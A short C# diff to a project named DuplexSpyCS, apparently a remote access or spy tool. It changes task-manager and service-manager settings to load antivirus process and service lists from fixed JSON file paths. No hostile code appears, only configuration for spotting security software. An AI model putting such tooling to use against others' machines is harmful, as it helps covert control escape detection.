@@ -246,13 +246,13 @@ namespace DuplexSpyCS
                     #endregion
                     #region Task Manager
 
-                    taskMgr_szAVjson = Read("TaskMgr", "AVjson"),
+                    taskMgr_szAVjson = Path.Combine(Application.StartupPath, "Config", "antivirus_proc.json"),
                     taskMgr_bGetChildProcess = Read("TaskMgr", "childproc") == "1",
 
                     #endregion
                     #region Service Manager
 
-                    servMgr_szAVjson = Read("ServMgr", "AVjson"),
+                    servMgr_szAVjson = Path.Combine(Application.StartupPath, "Config", "antivirus_serv.json"),
 
                     #endregion
                     #region RegEdit
